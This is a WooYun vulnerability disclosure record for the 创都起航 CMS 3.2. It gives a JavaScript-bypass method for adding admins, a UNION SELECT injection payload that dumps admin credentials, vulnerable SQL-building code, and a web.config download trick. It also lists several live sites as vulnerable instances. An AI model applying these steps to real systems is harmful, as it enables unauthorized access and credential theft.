{"id": 32806, "wybug_id": "wooyun-2015-0110318", "wybug_title": "创都起航漏洞大集合（任意添加管理员、后台注入、文件下载）", "wybug_corp": "创都起航", "wybug_author": "Damo", "wybug_date": "2015-04-27 12:49", "wybug_open_date": "2015-06-11 12:50", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "设计不当导致攻击界面扩大"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-27：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-06-11：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 上次没通过。请提供至少5个以上非demo的互联网实例 。因为上次哪个需要用户注册之后才能有影响所以才有了下面这篇   具体请看详细 详细说明：  软件版本：创都启航企业网站管理系统3.2最新版1、任意添加管理员 问题出现在：CDQHCmsBack/Admin_User.aspx 文件下 看以下CS代码片段\nprotected void Page_Load(object sender, EventArgs e)    {        if (!Commen1.JudgeLogin(this.Page, this.DAL1))//此处判断是否登录 否则弹出JS        /*省略*/    }    protected void ImageButton1_Click(object sender, EventArgs e)    {        string text = base.Request.Form[\"UserName\"].ToString().Trim();        string password = base.Request.Form[\"UserPwd\"].ToString().Trim();        string text2 = FormsAuthentication.HashPasswordForStoringInConfigFile(password, \"MD5\");        int num = Convert.ToInt32(this.DAL1.ExecuteScalar(string.Concat(new string[]        {            \"select count(*) from admin where admin='\",            text,            \"' and pwd='\",            text2,            \"'\"        })));//这里添加用户        if (num > 0)        {            base.Response.Redirect(\"Admin_User.aspx?A=\" + text + \"&P=\" + text2);            return;        }        base.Response.Write(\"<script language=javascript>window.alert('请您正确输入用户名和密码！(普通用户不能登录！)');window.location.href=('Admin_User_Login.aspx');</script>\");    }、\n如果在未管理员未登录的情况下Commen1.JudgeLogin这个函数则输出以下内容：\npage.Response.Write(\"<script language=javascript>window.alert('请您重新登陆。');window.location.href=('Admin_Login.aspx')</script>\");\n这个地方可以看出 代码只是用JS控制页面的访问以及跳转。只要我们能绕过JS便可以添加用户了 看以下操作：首先将火狐的javascript.enabled 改为false\n\n然后浏览器访问\n\n在这里可以任意添加用户 然后点击“添加”即可   点击后只是页面刷新了一下 没有其他反应。我们看一下本地数据库如下图：\n\n然后访问/CDQHCmsBack/Admin_Login.aspx   登录即可\n\n2、后台注入注入1\nhttp://192.168.10.55:7666/CDQHCmsBack/CmsLookMessageMember.aspx?id=0 union all select id,admin,pwd,lognum,'',logtime,'' from admin\n\n\n注入2：\nhttp://192.168.10.55:7666/CDQHCmsBack/CmsDelMessageMember.aspx\n\nstring text = (base.Request.QueryString[\"id\"] == null) ? \"\" : base.Request.QueryString[\"id\"];            if (text == \"\")            {                return;            }            this.Bll1.Delete(\"delete from QH_MessageMember where id=\" + text);\n注入3：\nhttp://192.168.10.55:7666/CDQHCmsBack/CmsMember_ModifyNews.aspx\n\nprotected void Page_Load(object sender, EventArgs e)        {             /*省略N行*/                this.ViewState[\"id\"] = base.Request.QueryString[\"id\"].ToString();                this.DataToBind();            }        }        private void DataToBind()        {            DataTable dataTable = this.Bll1.GetDataTable(\"select Title,Content,AddDate,ModyDate,Author,hits from Member_News where id=\" + (string)this.ViewState[\"id\"]);            if (dataTable == null)             /*省略N行*/            }\n注入4：\nhttp://192.168.10.55:7666/CDQHCmsBack/CmsMemberManage\n\nprivate int CalculateRecordNumber()        {            return this.Bll1.DAL1.ExecuteReader(\"select count(*) as co from MemberUser \" + (string)this.ViewState[\"QWhere\"]);        }        private ICollection CreateSource()        {            string strQuery = \"select  *,switch(Sex='1','男',Sex='2','女',true, '未知') as Sex from MemberUser \" + (string)this.ViewState[\"QWhere\"] + \" order by UserID desc \";\n注入5：\nhttp://192.168.10.55:7666/CDQHCmsBack/CmsOrderDetails.aspx\n\nstring text = base.Request.QueryString[\"sub_num\"];            if (string.IsNullOrEmpty(text))            {                return;            }            try            {                DataSet dataSet = this.Bll1.DAL1.GetDataSet(\"select * from ShopCart_basket where sub_number='\" + text + \"' and basket_check=1 order by basket_id asc\");\n 后台注入还有很多 一一列举了  3任意文件下载在后台的【内容管理】-》【下载中心】-》【软件下载】中添加一个内容如下图：\n\n我们得到上传地址 ../UpFile/20150323015609718.ZIP那我将地址更改为../web.config如下图：\n\n保存后直接在列表中预览   然后点击“立即下载”  结果如下图：\n\n另外可以通过在后台更改上传文件格式 边可以getshell下班咯 吼吼   漏洞证明：  添加管理员\n\n后台注入：\n\n任意文件下载：\n\n实例：\nhttp://cj.haut.edu.cn/zyjs/CDQHCmsBack/Admin_User.aspxhttp://www.cyjyzx.cn/CDQHCmsBack/Admin_User.aspxhttp://www.lejian.net.cn/CDQHCmsBack/Admin_User.aspxhttp://www.bjsvs.com/CDQHCmsBack/Admin_User.aspxhttp://www.bgits.com.cn/CDQHCmsBack/Admin_User.aspxhttp://demo.95c.com.cn/CDQHCmsBack/Admin_User.aspx\n   修复方案：  解决方案 ：1权限验证不能单纯的依靠JS处理2注入  参数改过滤的过滤 该参数化的参数化3任意文件下载 文件访问权限的控制   版权声明：转载请注明来源 Damo@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}